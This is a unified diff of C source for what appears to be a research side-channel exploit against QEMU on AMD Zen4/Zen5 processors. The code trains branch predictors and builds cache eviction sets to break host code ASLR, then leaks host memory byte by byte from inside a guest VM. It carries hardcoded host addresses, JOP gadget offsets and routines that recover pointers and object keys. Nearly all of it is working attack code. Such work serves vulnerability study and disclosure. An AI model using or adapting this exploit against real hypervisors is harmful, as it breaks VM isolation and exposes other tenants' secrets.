@@ -1,53 +1,22 @@
-#include <ctype.h>
-#include <errno.h>
-#include <linux/memfd.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <time.h>
-#include <unistd.h>
-
-#define CACHE_MISS_THRES 300
-#define RB_OFFSET        0x10cc0
-#define RB_SLOTS         8
-#include "compiler.h"
-#include "flush_reload.h"
-#include "jita.h"
-#include "log.h"
-#include "mem.h"
-#include "rb_tools_2mb.h"
-
-uint64_t break_code_aslr(uint64_t *);
-
-#define PAGE_4K     (4096UL)
-#define PAGE_2M     (512 * PAGE_4K)
-#define PAGE_1G     (512 * PAGE_2M)
-#define PROT_RW     (PROT_READ | PROT_WRITE)
-#define PROT_RWX    (PROT_RW | PROT_EXEC)
-#define PG_ROUND(n) (((((n) - 1UL) >> 12) + 1) << 12)
-
-// #define NO_MMIO
+// #define DEBUG_ADDR
 // #define DEBUG_HIT
 // #define DEBUG_RB
+// #define DEBUG_HIST
 // #define DEBUG_LEAK
+// #define DEBUG_LEAK_PRINT
+// #define DEBUG_PTR_LEAK
 // #define DEBUG_RESOLVE
 // #define DEMO
+
+#define ROUNDS           4
+#define RB_ENTRY         0
+#define RB_OFFSET        0x10cc0
+#define RB_SLOTS         4
+#define CACHE_MISS_THRES 300
+
+// #define NO_MMIO
+#define REDUCE_L3 // speeds things up a lot
 #define AUTOMATIC_KEY_SELECTION
-
-#define MMIO_BASE                0xfed00000
-#define HVA_SRC                  0x555555e8bea1                  // offset 0x937ea1
-#define HVA_VICTIM_DST           0x540000000000                  // offset 0x937ea1
-#define HVA_DST_STAGE_1          (HVA_SRC - 0x937ea1 + 0xac334e) // offset 0x753aa9, JOP chain
-#define HVA_DST_STAGE_2          (HVA_SRC - 0x937ea1 + 0x8260b5) // offset 0x9b0a01, JOP chain
-#define HVA_DST_HPET             0x555555c41040                  // hpet target
-#define QEMU_OBJECTMAYHEM_STATIC 0x5555571822f0
-#define GADGET_OFFSET_0          0x2b58
-#define GADGET_OFFSET_1          0x0
-#define GADGET_OFFSET_2          0x0
-#define NEXT_POINTER_OFFSET_2    0x2b50
-#define EViCT_MEM_ADDR           0x700000000000
-
 // automate the key selection when running evaluation
 #ifdef AUTOMATIC_KEY_SELECTION
 #define QEMU_MAGIC_ROOT_OBJECT   3
@@ -57,8 +26,93 @@ uint64_t break_code_aslr(uint64_t *);
 #define QEMU_MAGIC_SECRET_OBJECT -1
 #endif
 
-#define ROUNDS   4
-#define RB_ENTRY 0
+#define MEM_SIZE                 (PAGE_1G / 8)
+#define MMIO_BASE                0xfed00000
+#define HVA_SRC                  0x555555e8bea1                  // offset 0x937ea1
+#define HVA_VICTIM_DST           0x540000000000                  // arbitrary
+#define HVA_DST_STAGE_1          (HVA_SRC - 0x937ea1 + 0xac334e) // offset 0xac334e, JOP chain
+#define HVA_DST_STAGE_2          (HVA_SRC - 0x937ea1 + 0x8260b5) // offset 0x8260b5, JOP chain
+#define HVA_DST_RAX_LEAK         (HVA_SRC - 0x937ea1 + 0x931987) // offset 0x931987, JOP chain
+#define HVA_DST_RB_FIND          (HVA_SRC - 0x937ea1 + 0x940838) // offset 0x940838, JOP chain
+#define HVA_DST_HPET             0x555555c41040                  // hpet target
+#define QEMU_OBJECTMAYHEM_STATIC 0x5555571822f0
+#define GADGET_OFFSET_0          0x2b58
+#define GADGET_OFFSET_1          0x0
+#define GADGET_OFFSET_2          0x0
+#define NEXT_POINTER_OFFSET_2    0x2b50
+#define EVICT_MEM_ADDR           0x700000000000
+
+// Uarch specific config
+#if defined(MARCH_ZEN5)
+#define NUM_MEASUREMENTS  8
+#define EVICT_ITERATIONS  2
+#define EVICTION_BASELINE 160
+#define L2_EVICTION_SIZE  18
+#define L2_SETS           1024
+#define L2_FREE_SHIFT     16
+#define L2_2MB_SET_SIZE   32
+#define L2_1GB_SET_SIZE   1024 // max 8192
+#define L3_SETS           32 * 1024
+#define L3_SET_SIZE       64
+#define NUM_TRAIN         4
+#define NUM_UNTRAIN       2
+#define REDUCE_CHUNK      8
+#define LEAK_ROUNDS       (ROUNDS)
+#define LEAK_THRESH       (ROUNDS / 4)
+#define RB_INITIAL_ROUNDS (ROUNDS / 2)
+#elif defined(MARCH_ZEN4)
+#define NUM_MEASUREMENTS  16
+#define EVICT_ITERATIONS  2
+#define EVICTION_BASELINE 135
+#define L2_EVICTION_SIZE  14
+#define L2_SETS           2048
+#define L2_FREE_SHIFT     17
+#define L2_2MB_SET_SIZE   16
+#define L2_1GB_SET_SIZE   512 // max 8192
+#define L3_SETS           32 * 1024
+#define L3_SET_SIZE       64
+#define NUM_TRAIN         2
+#define NUM_UNTRAIN       1
+#define REDUCE_CHUNK      8
+#define LEAK_ROUNDS       (2 * ROUNDS)
+#define LEAK_THRESH       (ROUNDS / 4)
+#define RB_INITIAL_ROUNDS (ROUNDS)
+#else
+#error "Unknown microarchitecture"
+#endif
+#define L1_THRESH  0
+#define L2_THRESH  10
+#define L3_THRESH  30
+#define RAM_THRESH 300
+
+#define PAGE_4K  (4096UL)
+#define PAGE_2M  (512 * PAGE_4K)
+#define PAGE_1G  (512 * PAGE_2M)
+#define PROT_RW  (PROT_READ | PROT_WRITE)
+#define PROT_RWX (PROT_RW | PROT_EXEC)
+
+#include "compiler.h"
+#include "jita.h"
+#include "kmod/pi.h"
+#include "lib.h"
+#include "log.h"
+#include "mem.h"
+#include "psnip.h"
+#include "rb_tools_2mb.h"
+#include "stub.h"
+#include <ctype.h>
+#include <err.h>
+#include <fcntl.h>
+#include <linux/memfd.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <time.h>
+#include <unistd.h>
+
+uint64_t break_code_aslr(uint64_t *);
 
 extern char psnip_src_call_label[];
 extern char psnip_src_entry_label[];
@@ -67,32 +121,33 @@ extern char psnip_src_entry_label[];
 uarf_psnip_declare_define(psnip_src,
     "step3:\n\t"                // 0x555555e8be20
     ".fill 0x4b, 0x1, 0x90\n\t"
-    "test %ebx,%ebx\n\t"        // 0x555555e8be6b
+    "test %ebx,%ebx\n\t"
     "je step2\n\t"              // 0x555555e8be6d
     ".fill 0x21, 0x1, 0x90\n\t"
-    
+
     "step1: \n\t"               // 0x555555e8be90
     ".fill 0x11, 0x1, 0x90\n\t"
     "psnip_src_call_label:\n\t"
     "call *0x8(%rax)\n\t"       // 0x555555e8bea1
     ".fill 0x2c, 0x1, 0x90\n\t"
 
-    "step2:\n\t"
-    "test %ebx,%ebx\n\t"        // 0x555555e8bed0
+    "step2:\n\t"                // 0x555555e8bed0
+    "test %ebx,%ebx\n\t"
     "je step1\n\t"              // 0x555555e8bed2
     ".skip 0x7eac\n\t"
 
-    "psnip_src_entry_label:\n\t"// 0x555555e93d80 <--- entrypoint of this snippet
-    ".fill 0x4c, 0x1, 0x90\n\t"
-    "test %ebx,%ebx\n\t"        // 0x555555de5188
+    "psnip_src_entry_label:\n\t"// <--- entrypoint of this snippet
+    ".fill 0x4c, 0x1, 0x90\n\t" // 0x555555e93d80
+    "test %ebx,%ebx\n\t"
     "je step5\n"                // 0x555555e93dce
     ".fill 0x3, 0x1, 0x90\n\t"
 
     "step4:\n\t"                // 0x555555e93dd7
-    ".fill 0x84, 0x1, 0x90\n\t"
+    ".fill 0x7d, 0x1, 0x90\n\t"
+    "lea step3(%rip), %rcx\n\t"
     "call *%rcx\n\t"            // 0x555555e93e5b
     ".fill 0x43, 0x1, 0x90\n\t"
-    
+
     "step5:\n\t"                // 0x555555e93ea0
     ".fill 0x4c, 0x1, 0x90\n\t"
     "jmp step4\n\t"             // 0x555555e93eec
@@ -100,21 +155,21 @@ uarf_psnip_declare_define(psnip_src,
 // clang-format on
 
 // clang-format off
-uarf_psnip_declare_define(psnip_victim_dst, 
+uarf_psnip_declare_define(psnip_victim_dst,
     "add $16, %rsp\n"
     "ret\n\t"
 );
 // clang-format on
 
 // clang-format off
-uarf_psnip_declare_define(psnip_train_stage_1, 
+uarf_psnip_declare_define(psnip_train_stage_1,
     ".fill 0x8, 0x1, 0x90\n\t"
     "call *0x10(%rax)\n\t"
 );
 // clang-format on
 
 // clang-format off
-uarf_psnip_declare_define(psnip_train_stage_2, 
+uarf_psnip_declare_define(psnip_train_stage_2,
     ".fill 0x100, 0x1, 0x90\n\t"
     "add $24, %rsp\n"
     "ret\n\t"
@@ -122,56 +177,32 @@ uarf_psnip_declare_define(psnip_train_stage_2,
 // clang-format on
 
 // clang-format off
-uarf_psnip_declare_define(psnip_hpet_signal_dst, 
+uarf_psnip_declare_define(psnip_hpet_signal_dst,
     "mov (%rdx), %r8\n\t"
-    "add $16, %rsp\n"
-    "ret\n\t"
+    "int3\n\t"
 );
 // clang-format on
 
-#define MARCH_ZEN4
-#if defined(MARCH_ZEN5)
-#define NUM_MEASUREMENTS 8
-#define EVICT_ITERATIONS 2
-#define L2_EVICTION_SIZE 18
-#define L2_SETS          1024
-#define L2_FREE_SHIFT    16
-#define L2_2MB_SET_SIZE  32
-#define L2_1GB_SET_SIZE  1024 // max 8192
-#define L3_SETS          32 * 1024
-#define L3_SET_SIZE      32
-#elif defined(MARCH_ZEN4)
-#define NUM_MEASUREMENTS 16
-#define EVICT_ITERATIONS 1
-#define L2_EVICTION_SIZE 14
-#define L2_SETS          2048
-#define L2_FREE_SHIFT    17
-#define L2_2MB_SET_SIZE  16
-#define L2_1GB_SET_SIZE  512 // max 8192
-#define L3_SETS          32 * 1024
-#define L3_SET_SIZE      64
-#else
-#error "Unknown microarchitecture"
-#endif
-
-volatile uint64_t *l2_sets[L2_SETS][L2_1GB_SET_SIZE] = {0};
 uint64_t l2_sets_offset = 0;
 uint64_t measurements[NUM_MEASUREMENTS];
-uint64_t dst_victim_ptr[0x50];
-uint64_t dst_train_ptr[0x50];
-uint64_t dummy_val[0x1000];
+uint64_t dst_ptr[0x50];
 
 static int stats_compare_u64(const void *a, const void *b) {
     return *(uint64_t *) a > *(uint64_t *) b;
 }
 
 uint64_t stats_median_u64(uint64_t *arr, uint64_t arr_len) {
-    if (!arr_len)
-        err(1, "0 length array has no median");
+    if (!arr_len) {
+        UARF_LOG_ERROR("0 length array has no median\n");
+        return 1;
+    }
 
     uint64_t *copy = calloc(arr_len, sizeof(*arr));
-    if (!copy)
-        err(1, "failed to temp arr");
+
+    if (!copy) {
+        UARF_LOG_ERROR("Failed to calloc temp array\n");
+        return 1;
+    }
 
     memcpy(copy, arr, arr_len * sizeof(*arr));
     qsort(copy, arr_len, sizeof(*arr), stats_compare_u64);
@@ -183,11 +214,27 @@ uint64_t stats_median_u64(uint64_t *arr, uint64_t arr_len) {
     return median;
 }
 
-uint64_t measure_self_eviction(volatile uint64_t **eviction_set) {
+static volatile uint64_t *set_remove(volatile uint64_t **set_new,
+                                     volatile uint64_t **set_old, uint64_t set_size,
+                                     uint64_t index) {
+    if (index >= set_size) {
+        UARF_LOG_ERROR("Index out of bounds\n");
+        exit(1);
+    }
+
+    volatile uint64_t *removed = set_old[index];
+    memmove(set_new, set_old, index * sizeof(set_old[0]));
+    memmove(&set_new[index], &set_old[index + 1],
+            (set_size - index - 1) * sizeof(set_old[0]));
+    return removed;
+}
+
+uint64_t measure_self_eviction(volatile uint64_t **eviction_set,
+                               uint64_t eviction_set_size) {
     for (int i = 0; i < NUM_MEASUREMENTS; ++i) {
         uint64_t start = rb_rdtsc();
         uarf_lfence();
-        for (int e = 0; e < L2_EVICTION_SIZE; ++e) {
+        for (int e = 0; e < eviction_set_size; ++e) {
             *eviction_set[e];
         }
         uarf_lfence();
@@ -201,7 +248,7 @@ uint64_t measure_self_eviction(volatile uint64_t **eviction_set) {
 
 uint8_t check_self_eviction(volatile uint64_t **eviction_set, uint64_t baseline) {
 
-    return measure_self_eviction(eviction_set) > baseline + 250;
+    return measure_self_eviction(eviction_set, L2_EVICTION_SIZE) > baseline + 250;
 }
 
 uint8_t check_cross_eviction(volatile uint64_t **eviction_set_1,
@@ -213,12 +260,12 @@ uint8_t check_cross_eviction(volatile uint64_t **eviction_set_1,
     for (int i = L2_EVICTION_SIZE / 2; i < L2_EVICTION_SIZE; ++i) {
         eviction_set[i] = eviction_set_2[i];
     }
-    uint64_t total_time = measure_self_eviction(eviction_set);
+    uint64_t total_time = measure_self_eviction(eviction_set, L2_EVICTION_SIZE);
 
     return total_time > baseline + 200;
 }
 
-uint8_t build_l2_sets(uint64_t mem_ptr, uint64_t baseline,
+uint8_t build_l2_sets(uint64_t mem_ptr, uint64_t mem_size, uint64_t baseline,
                       volatile uint64_t *l2_sets[L2_SETS][L2_1GB_SET_SIZE]) {
     static volatile uint64_t *l2_set_wip[L2_SETS][L2_2MB_SET_SIZE] = {0};
 
@@ -228,7 +275,7 @@ uint8_t build_l2_sets(uint64_t mem_ptr, uint64_t baseline,
     l2_sets_offset = 0;
 
     // find the first 2MB page where we can build all the sets
-    for (uint64_t offset_2m = 4; offset_2m < PAGE_1G / PAGE_2M; ++offset_2m) {
+    for (uint64_t offset_2m = 4; offset_2m < mem_size / PAGE_2M; ++offset_2m) {
         uint64_t base_2m = mem_ptr + (offset_2m << 21);
 
         // build the sets within the 2MB pages
@@ -276,7 +323,7 @@ uint8_t build_l2_sets(uint64_t mem_ptr, uint64_t baseline,
                                     printf("\nMy heuristic is wrong!\n");
                                 }
                                 if (hit_index != -1) {
-                                    err(1, "mutlihit");
+                                    UARF_LOG_ERROR("Non-unique L2 set match\n");
                                 }
                                 hit_index = cur_index;
                                 set_xor = cur_index ^ i;
@@ -329,9 +376,9 @@ void trigger_ibpb() {
 
 typedef struct actxt {
     uint64_t entry_point;
-    uint64_t extra_call;
     uint64_t rb_hva;
     uint64_t stage_2_addr;
+    uint64_t victim_call_src;
     int64_t rb_offset;
     volatile uint64_t **eviction_set;
     size_t eviction_set_size;
@@ -339,18 +386,37 @@ typedef struct actxt {
 } actxt_t;
 
 uint8_t attack_loop(actxt_t *actxt, uint64_t rounds, uint64_t thresh,
-                    uint64_t pre_load_addr, uint64_t mmio_param, int rb_slot) {
+                    uint64_t pre_load_addr, uint64_t mmio_param, int rb_slot,
+                    int early_stop) {
     rb_reset();
     for (size_t i = 0; i < rounds; i++) {
-        trigger_ibpb();
+        // evict the training using NOPs?
+        // write new code to trick the BTB
+        uint8_t new_data[] = {
+            0xeb, 0x01,       // jmp next
+            0x90,             // nop
+            0xff, 0x50, 0x08, // next: call   *0x8(%rax)
+        };
+        char old_data[sizeof(new_data)];
+        uint64_t victim_call_src = actxt->victim_call_src;
+        memcpy(old_data, _ptr(victim_call_src), sizeof(new_data));
+        memcpy(_ptr(victim_call_src), new_data, sizeof(new_data));
+        for (int i = 0; i < NUM_UNTRAIN; ++i) {
+            asm volatile(""
+                         "call *%2\n\t"
+                         :
+                         : "a"(dst_ptr), "b"(0), "r"(actxt->entry_point)
+                         : "r8", "memory");
+        }
+        // put back the old code
+        memcpy(_ptr(victim_call_src), old_data, sizeof(new_data));
 
         // Train victim -> disclosure gadget using HVA
-        {
+        for (int i = 0; i < NUM_TRAIN; ++i) {
             asm volatile(""
-                         "call *%3\n\t"
+                         "call *%2\n\t"
                          :
-                         : "a"(dst_train_ptr), "b"(0), "c"(actxt->extra_call),
-                           "r"(actxt->entry_point)
+                         : "a"(dst_ptr), "b"(0), "r"(actxt->entry_point)
                          : "r8", "memory");
         }
 
@@ -360,9 +426,9 @@ uint8_t attack_loop(actxt_t *actxt, uint64_t rounds, uint64_t thresh,
             for (int k = 0; k < EVICT_ITERATIONS; ++k) {
                 for (int e = 0; e < actxt->eviction_set_size; ++e) {
                     *actxt->eviction_set[e];
-                    uarf_lfence();
                 }
             }
+            uarf_lfence();
         }
         if (pre_load_addr) {
             *(volatile uint64_t *) (pre_load_addr);
@@ -376,21 +442,27 @@ uint8_t attack_loop(actxt_t *actxt, uint64_t rounds, uint64_t thresh,
         for (volatile size_t i = 0; i < 10000; i++) {
         }
         rb_reload();
+
+        if (early_stop && rb_hist[rb_slot] > thresh) {
+#ifdef DEBUG_HIST
+            printf("\nrb: %s, [%u]: %lu\n", gen_rb_heat(), RB_ENTRY, rb_hist[RB_ENTRY]);
+#endif
+            return rb_hist[rb_slot];
+        }
     }
 
     if (rb_hist[rb_slot] > thresh) {
-
-#ifdef DEBUG_RB
+#ifdef DEBUG_HIST
         printf("\nrb: %s, [%u]: %lu\n", gen_rb_heat(), RB_ENTRY, rb_hist[RB_ENTRY]);
 #endif
-        return 1;
+        return rb_hist[rb_slot];
     }
 
     return 0;
 }
 
 uint8_t check_byte_thresh(actxt_t *actxt, uint64_t secret_ptr, uint64_t rounds,
-                          uint64_t thresh) {
+                          uint64_t thresh, int early_stop) {
     int64_t memory_offset = (RB_ENTRY * RB_STRIDE - (GADGET_OFFSET_2 - RB_OFFSET));
     uint64_t attack_ptr_gva = RB_PTR + memory_offset + actxt->rb_offset;
     uint64_t attack_ptr_hva = actxt->rb_hva + memory_offset + actxt->rb_offset;
@@ -403,7 +475,7 @@ uint8_t check_byte_thresh(actxt_t *actxt, uint64_t secret_ptr, uint64_t rounds,
         secret_ptr - GADGET_OFFSET_1;
 
     return attack_loop(actxt, rounds, thresh, attack_ptr_gva + GADGET_OFFSET_0,
-                       attack_ptr_hva, RB_ENTRY);
+                       attack_ptr_hva, RB_ENTRY, early_stop);
 }
 
 uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
@@ -415,7 +487,7 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
 #define CHECK_RANGE     (256 + DOWN_EXTEND + UP_EXTEND)
 #define QUICK_THRESHOLD 500
 #else
-#define CHECK_RANGE     256
+#define CHECK_RANGE     (208 + DOWN_EXTEND)
 #define QUICK_THRESHOLD 32
 #endif
     // find a long chain that might wrap around
@@ -430,7 +502,7 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
     int miss_count = 0;
     for (int i = 0; i < CHECK_RANGE; ++i) {
         sctxt.rb_offset = -i + DOWN_EXTEND;
-        uint8_t hit = check_byte_thresh(&sctxt, secret_ptr, ROUNDS, ROUNDS / 2);
+        uint8_t hit = check_byte_thresh(&sctxt, secret_ptr, LEAK_ROUNDS, LEAK_THRESH, 1);
 
 #ifdef DEBUG_LEAK
         if (hit) {
@@ -479,66 +551,132 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
     printf("\n");
 #endif
     uint8_t start_byte = ((chain_start + (256 + 55 - DOWN_EXTEND)) % 256);
-    *byte = start_byte;
+    if (byte) {
+        *byte = start_byte;
+    }
 #ifdef DEBUG_LEAK
     uint8_t end_byte = ((chain_end + (256 + -12 - DOWN_EXTEND)) % 256);
     if (start_byte != end_byte) {
         printf("disagreement: %u != %u\n", start_byte, end_byte);
     }
 #endif
+    if (chain_start == -1)
+        return 0;
+    return 1;
+}
+
+int get_most_common(uint64_t *arr_orig, size_t arr_len, uint64_t *result) {
+    if (!arr_len) {
+        UARF_LOG_ERROR("get_most_common: zero length array\n");
+        return 0;
+    }
+    // try to find the byte with the most occurences but in a lazy way
+    uint64_t most_common_val;
+    uint64_t max_count;
+    uint64_t cur_val;
+    uint64_t cur_count;
+
+    uint64_t *arr = calloc(arr_len, sizeof(*arr_orig));
+    if (!arr) {
+        UARF_LOG_ERROR("get_most_common: failed to allocate array\n");
+        return 0;
+    }
+    memcpy(arr, arr_orig, arr_len * sizeof(arr));
+    qsort(arr, arr_len, sizeof(*arr), stats_compare_u64);
+
+    most_common_val = cur_val = arr[0];
+    max_count = cur_count = 1;
+    for (int i = 1; i < arr_len; ++i) {
+        if (arr[i] == cur_val) {
+            cur_count += 1;
+            if (cur_count > max_count) {
+                max_count = cur_count;
+                most_common_val = arr[i];
+            }
+        }
+        else {
+            cur_val = arr[i];
+            cur_count = 1;
+        }
+    }
+
+    if (result) {
+        *result = most_common_val;
+    }
+
+    free(arr);
+    return max_count;
+}
+
+uint64_t leak_byte_reliably(actxt_t *ctxt, uint64_t secret_ptr, uint8_t *result_ptr) {
+#define BYTE_LEAK_RETRIES 4
+#define BYTE_INVALID      UINT64_MAX
+    uint64_t val_arr[BYTE_LEAK_RETRIES];
+    for (int i = 0; i < BYTE_LEAK_RETRIES; ++i) {
+        uint8_t val;
+        if (leak_byte(ctxt, secret_ptr, &val)) {
+            val_arr[i] = val;
+        }
+        else {
+            val_arr[i] = UINT64_MAX;
+        }
+#ifdef DEBUG_PTR_LEAK
+        printf("byte: 0x%02lx\n", val_arr[i]);
+#endif
+    }
+
+    uint64_t result;
+    int count = get_most_common(val_arr, BYTE_LEAK_RETRIES, &result);
+
+    // not enough consistency on the hits
+    if (count <= BYTE_LEAK_RETRIES / 4) {
+        return 0;
+    }
+
+    // filter out invalid bytes
+    if (result == BYTE_INVALID) {
+        return 0;
+    }
+
+    if (result_ptr) {
+        *result_ptr = result;
+    }
     return 1;
 }
 
 uint64_t leak_pointer_reliably(actxt_t *ctxt, uint64_t secret_base_ptr,
                                uint64_t *result_ptr) {
 #define ROOT_PTR_SIZE    8
-#define PTR_LEAK_RETRIES 8
+#define PTR_LEAK_RETRIES 4
     union {
         uint8_t arr[ROOT_PTR_SIZE];
         uint64_t val;
         void *ptr;
-    } ptr_arr[PTR_LEAK_RETRIES];
-    for (int i = 0; i < PTR_LEAK_RETRIES; ++i) {
+    } ptr = {.val = 0xEEEEEEEEEEEEEEEE};
+    for (int i = 0; i < PTR_LEAK_RETRIES && (ptr.val & 0xFFFF800000000000ul); ++i) {
         for (uint64_t secret_offset = 0; secret_offset < ROOT_PTR_SIZE; ++secret_offset) {
             uint64_t secret_ptr = secret_base_ptr + secret_offset;
-            while (!leak_byte(ctxt, secret_ptr, &ptr_arr[i].arr[secret_offset]))
-                ;
-        }
-    }
-    qsort(ptr_arr, PTR_LEAK_RETRIES, sizeof(*ptr_arr), stats_compare_u64);
-
-    // try to find the pointer with the most occurences but in a lazy way
-    uint64_t ptr = 0;
-    uint8_t found = 0;
-    {
-        uint64_t ptr_cur = 0;
-        uint64_t count = 0;
-        uint64_t max_count = 0;
-        for (int i = 0; i < PTR_LEAK_RETRIES; ++i) {
-            if (ptr_arr[i].val != ptr_cur) {
-                ptr_cur = ptr_arr[i].val;
-                count = 1;
-            }
-            else {
-                count += 1;
-            }
-            if (count > max_count && count > PTR_LEAK_RETRIES / 4) {
-                max_count = count;
-                ptr = ptr_cur;
-                found = 1;
+            // for (int i = 0; i < 16; ++i) {
+            //     attack_loop(ctxt, 256, 256, 0, secret_ptr - GADGET_OFFSET_0, RB_ENTRY);
+            // }
+            if (!leak_byte_reliably(ctxt, secret_ptr, &ptr.arr[secret_offset])) {
+                break;
             }
         }
-    }
-    if (!found) {
-        return 0;
+#ifdef DEBUG_PTR_LEAK
+        printf("ptr: 0x%012lx\n", ptr.val);
+#endif
     }
 
     // filter out clearly invalid pointers (when using 48-bit virtual addresses)
-    if (ptr & 0xFFFF800000000000ul) {
+    if (ptr.val & 0xFFFF800000000000ul) {
+#ifdef DEBUG_PTR_LEAK
+        UARF_LOG_ERROR("Not a pointer\n");
+#endif
         return 0;
     }
 
-    *result_ptr = ptr;
+    *result_ptr = ptr.val;
     return 1;
 }
 
@@ -561,6 +699,15 @@ uint8_t resolve_object(actxt_t *ctxt, uint64_t parent_obj, uint64_t *result_ptr,
     fflush(stdout);
 #endif
 
+    uint8_t size;
+    if (!leak_byte_reliably(ctxt, hash_table_ptr, &size)) {
+        UARF_LOG_ERROR("Failed to leak hash table size\n");
+        return 0;
+    }
+#ifdef DEBUG_RESOLVE
+    printf("size: 0x%02x\n", size);
+#endif
+
     uint64_t hash_table_key_ptr_ptr = hash_table_ptr + 0x20;
     uint64_t hash_table_key_ptr;
     if (!leak_pointer_reliably(ctxt, hash_table_key_ptr_ptr, &hash_table_key_ptr)) {
@@ -572,13 +719,6 @@ uint8_t resolve_object(actxt_t *ctxt, uint64_t parent_obj, uint64_t *result_ptr,
 #else
     printf("->keys\n");
     fflush(stdout);
-#endif
-
-    uint8_t size;
-    while (!leak_byte(ctxt, hash_table_ptr, &size))
-        ;
-#ifdef DEBUG_RESOLVE
-    printf("size: 0x%02x\n", size);
 #endif
 
     // get all the key pointers
@@ -596,13 +736,22 @@ uint8_t resolve_object(actxt_t *ctxt, uint64_t parent_obj, uint64_t *result_ptr,
         printf("- keys[%02d]: ", i);
         if (key_ptrs[i] & 0xFFFF00000000ul) {
             uint8_t next_byte = 1;
-            for (int b = 0; b < 32; b += 1) {
-                while (!leak_byte(ctxt, key_ptrs[i] + b, &next_byte))
-                    ;
-                if (next_byte == 0)
-                    break;
-                printf("%c", next_byte);
+            // only print the first 32 characters of the key
+            int b = 0;
+            for (; b < 32; b += 1) {
+                if (!leak_byte(ctxt, key_ptrs[i] + b, &next_byte)) {
+                    printf("?");
+                }
+                else {
+                    if (next_byte == 0)
+                        break;
+                    printf("%c", next_byte);
+                }
                 fflush(stdout);
+            }
+            // show that we do not print the full key
+            if (b == 32 && next_byte != 0) {
+                printf("...");
             }
         }
         else {
@@ -624,7 +773,9 @@ uint8_t resolve_object(actxt_t *ctxt, uint64_t parent_obj, uint64_t *result_ptr,
     if (index < 0 || index >= size) {
         UARF_LOG_ERROR("Invalid choice: %d/%d\n", index, size);
     }
+#ifndef DEBUG_RESOLVE
     printf("%s->table", label_parent);
+#endif
 
     uint64_t hash_table_value_ptr_ptr = hash_table_ptr + 0x30;
     uint64_t hash_table_value_ptr;
@@ -670,6 +821,27 @@ uint8_t resolve_object(actxt_t *ctxt, uint64_t parent_obj, uint64_t *result_ptr,
     return 1;
 }
 
+int check_good_l3set(actxt_t *ctxt, int rounds, int thresh) {
+#define TEST_BYTE_1 76
+#define TEST_BYTE_2 125
+    uint64_t secret_ptr_hva = ctxt->rb_hva;
+    uint64_t secret_ptr_gva = RB_PTR;
+
+    *(volatile uint64_t *) (secret_ptr_gva) = TEST_BYTE_1;
+    ctxt->rb_offset = -TEST_BYTE_1;
+    if (check_byte_thresh(ctxt, secret_ptr_hva, rounds, thresh, 1)) {
+        *(volatile uint64_t *) (secret_ptr_gva) = TEST_BYTE_2;
+        ctxt->rb_offset = -TEST_BYTE_2;
+        if (check_byte_thresh(ctxt, secret_ptr_hva, rounds, thresh, 1)) {
+            ctxt->rb_offset = 0;
+            return 1;
+        }
+    }
+    ctxt->rb_offset = 0;
+
+    return 0;
+}
+
 int main(int argc, char const *argv[]) {
     srand(time(NULL));
 
@@ -678,14 +850,14 @@ int main(int argc, char const *argv[]) {
 
     uarf_pi_init();
 
-    void *mem = mmap(_ptr(EViCT_MEM_ADDR), PAGE_1G, PROT_READ | PROT_WRITE,
+    void *mem = mmap(_ptr(EVICT_MEM_ADDR), MEM_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MFD_HUGE_2MB, -1, 0);
     if (mem == MAP_FAILED) {
         UARF_LOG_ERROR("Failed to map 1G\n");
         return 1;
     }
     // make memory mapped and varying contents to ensure that pages are not combined
-    for (uint64_t offset = 0; offset < PAGE_1G; offset += PAGE_4K) {
+    for (uint64_t offset = 0; offset < MEM_SIZE; offset += PAGE_4K) {
         *((volatile uint64_t *) (_ul(mem) + offset)) = offset;
     }
 
@@ -727,73 +899,82 @@ int main(int argc, char const *argv[]) {
         printf("\nusing provided victim location\n");
         uint64_t aslr_addr;
         if (sscanf(argv[1], "0x%lx\n", &aslr_addr) < 0) {
-            err(1, "sscanf");
+            UARF_LOG_ERROR("Failed to parse aslr_offset\n");
+            return 1;
         }
         aslr_offset = aslr_addr - HVA_SRC;
     }
     else {
-        // we can try multiple times
-        uint8_t res = 0;
-        for (int retry = 0; retry < 4 && !(res = break_code_aslr(&aslr_offset)); ++retry)
-            ;
-        if (!res) {
-            UARF_LOG_ERROR("failed to break code ASLR!\n");
+        if (!break_code_aslr(&aslr_offset)) {
+            UARF_LOG_ERROR("Failed to break code ASLR!\n");
             return 1;
         }
     }
     printf("victim at 0x%012lx\n", HVA_SRC + aslr_offset);
     clock_t end_aslr = clock();
 #ifndef DEMO
-    printf("code_aslr time = %fs\n", ((double) (end_aslr - start_aslr)) / CLOCKS_PER_SEC);
+    double code_aslr_time = ((double) (end_aslr - start_aslr)) / CLOCKS_PER_SEC;
+#ifdef MARCH_ZEN4
+    printf("code_aslr time = %fs\n", code_aslr_time);
+#endif
 #endif
     uint64_t rb_hint = 0;
     if (argc > 2) {
         if (sscanf(argv[2], "0x%lx\n", &rb_hint) < 0) {
-            err(1, "sscanf");
+            UARF_LOG_ERROR("Failed to parse rb_hint\n");
+            return 1;
         }
     }
+
+#ifdef DEBUG_ADDR
+    UARF_LOG_INFO("HVA_SRC: 0x%012lx\n", HVA_SRC);
+    UARF_LOG_INFO("HVA_DST_HPET: 0x%012lx\n", HVA_DST_HPET);
+    UARF_LOG_INFO("HVA_DST_STAGE_1: 0x%012lx\n", HVA_DST_STAGE_1);
+    UARF_LOG_INFO("HVA_DST_STAGE_2: 0x%012lx\n", HVA_DST_STAGE_2);
+#endif
 
     UarfStub stub_src = uarf_stub_init();
     UarfStub stub_victim_dst = uarf_stub_init();
     UarfStub stub_signal_hpet_dst = uarf_stub_init();
     UarfStub stub_train_stage_1 = uarf_stub_init();
     UarfStub stub_train_stage_2 = uarf_stub_init();
+    UarfStub stub_train_rb_find = uarf_stub_init();
+    UarfStub stub_train_rax_leak = uarf_stub_init();
     UarfJitaCtxt jita_src = uarf_jita_init();
     UarfJitaCtxt jita_victim_dst = uarf_jita_init();
     UarfJitaCtxt jita_signal_hpet_dst = uarf_jita_init();
     UarfJitaCtxt jita_train_stage_1 = uarf_jita_init();
